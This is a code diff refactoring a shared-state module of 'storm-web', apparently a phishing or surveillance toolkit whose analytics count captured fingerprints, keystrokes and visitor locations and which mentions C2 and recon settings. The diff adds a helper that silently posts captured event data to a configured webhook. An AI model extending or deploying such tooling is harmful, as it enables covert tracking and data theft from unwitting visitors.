@@ -4,14 +4,6 @@ Re-hosts a subset of ``storm-web/app.py`` module-level globals and a
 few helpers defined byte-for-byte from the legacy file so blueprints
 can be extracted one domain at a time without NR-2 drift.  P5 will
 introduce a real ``StateStore`` interface here.
-
-Currently hosted (verified by P3.1 / P3.2 char snapshots):
-  CONFIG, load_php_config, LOGIN_FAILS, ANALYTICS, track_event,
-  load_check_c, save_check_c, generate_token, change_token.
-
-Still in app.py (until the matching blueprint is moved): C2_*,
-MOBILE_*, WEBRTC_LEAKS, RECON_CONFIG, MOBILE_CAPTURE_DIRS,
-send_notification, _decode_data_url.
 """
 from __future__ import annotations
 
@@ -47,8 +39,8 @@ ANALYTICS: Dict[str, Any] = {
     'total_fingerprints': 0,
     'total_keystrokes': 0,
     'start_time': datetime.now().isoformat(),
-    'events': [],           # Last 500 events
-    'geo_data': [],         # Location captures for map
+    'events': [],
+    'geo_data': [],
     'hourly_activity': defaultdict(int),
     'template_stats': defaultdict(int),
     'browser_stats': defaultdict(int),
@@ -98,7 +90,7 @@ def generate_token() -> str:
     return api_key
 
 
-def change_token(token: str) -> str:
+def change_token(token: str) -> None:
     key = load_check_c()
     key['token'] = token
     key['expired'] = 'no'
@@ -126,9 +118,25 @@ def load_php_config(path=PHP_CONFIG_PATH) -> Dict[str, Dict[str, str]]:
 CONFIG: Dict[str, Dict[str, str]] = load_php_config()
 
 
+# === Notification fan-out (verbatim from app.py:344-353) ====================
+def send_notification(message_data: Dict[str, Any]) -> None:
+    """Best-effort generic-webhook delivery if Settings.json has a URL."""
+    try:
+        import requests as _requests
+        if os.path.exists('Settings.json'):
+            with open('Settings.json', 'r') as f:
+                settings = json.load(f)
+            webhook_url = settings.get('generic_webhook')
+            if webhook_url:
+                _requests.post(webhook_url, json=message_data)
+    except Exception:
+        pass
+
+
 __all__ = [
     "BASE_DIR", "PHP_CONFIG_PATH", "CHECK_C_PATH",
     "LOGIN_FAILS", "ANALYTICS", "CONFIG",
     "load_php_config", "load_check_c", "save_check_c",
     "generate_token", "change_token", "track_event",
+    "send_notification",
 ]
